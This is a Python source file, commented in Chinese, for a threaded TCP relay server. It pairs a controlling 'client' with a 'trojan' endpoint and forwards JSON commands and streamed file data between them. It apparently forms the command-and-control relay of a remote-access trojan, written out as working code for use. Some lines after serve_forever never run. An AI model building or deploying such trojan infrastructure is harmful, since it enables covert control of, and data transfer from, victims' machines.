from socketserver import ThreadingTCPServer,BaseRequestHandler
from json import loads,dumps
from settings import *
import sys

class MyHandler(BaseRequestHandler):
    client = dict() #该字典是用来存储客户端信息的
    trojan = dict() #该字典是用来存储木马端信息的
    isok = True #这个阀值是用来控制只发送一次确认双方都上线的
    t = True
    def setup(self) -> None:
        """
        描述：
          该方法是用来做 socket 连接预处理的，每当有一个新的 socket 连接进来时该方法就会被调用
          该方法会将上线信息进行存储，以便后面使用
        """
        data = self.request.recv(1024)
        if data and data.decode("utf-8") == "c":
            print("文件上传端上线")
            self.client[self.request] = self.request.getpeername()
        elif data and data.decode("utf-8") == "t":
            print("文件下载端上线")
            self.trojan[self.request] = self.request.getpeername()


    def handle(self) -> None:
        """
        描述：
          该方法是处理 socket 数据传输的句柄
        """
        while self.t:
            if self.client and self.trojan:
                #如果两端都成功连接到服务器则发送 {"info":"yes"} 数据来确认双方都已经在线，可以进行数据传输
                if self.isok:
                    for i in self.client.keys():
                        i.send(dumps({"info":"yes"}).encode("utf-8"))
                    self.isok = False
            data = self.request.recv(1024) #接收对端数据
            if data:
                #判断是否是退出
                data = data.decode("utf-8")
                if data == "exit":
                    break
                else:
                    data = loads(data) #对数据进行 json 反序列化得到一个字典 {"whoami":"c或t(c代表数据发送方，t代表接收方)","data":"数据"}
                    if data.get("whoami") == "c":
                        send_data = data.get("data")
                        if send_data == "senddata": #判断数据发送方是否准备好发送数据 {"whoami":"c","data":"senddata"}
                            while True:
                                d = self.request.recv(1024)
                                for i in self.trojan.keys():
                                    i.sendall(d) #这里使用 sendall() 方法是为了防止要等待缓存满了才发送数据，要一接收到就发送完所有
                        else:
                            for i in self.trojan.keys():
                                i.send(send_data.encode("utf-8"))
                    elif data.get("whoami") == "t":
                        send_data = data.get("data").encode("utf-8")
                        for i in self.client.keys():
                            i.send(send_data)
                    else:
                        break
    def finish(self) -> None:
        """
        描述：
          该方法是用来做退出的，在一个 handle() 方法完成工作后就会调用此方法
        """
        #清理所有的连接数据和socket对象
        if {self.request} & {i for i in self.client.keys()} == {self.request}:
            for i in self.client.keys():
                i.close()
            for i in self.trojan.keys():
                i.close()
            self.client.clear()
            self.trojan.clear()
            sys.exit(-1)
        if {self.request} & {i for i in self.trojan.keys()} == {self.request}:
            for i in self.client.keys():
                i.close()
            for i in self.trojan.keys():
                i.close()
            self.client.clear()
            self.trojan.clear()
            sys.exit(-1)

server = ThreadingTCPServer((LOCAL_IP,60000),MyHandler)
server.request_queue_size=2 #表示最大连接数为 2 个
server.serve_forever() #表示持久运行
server.daemon_threads = True
server.shutdown()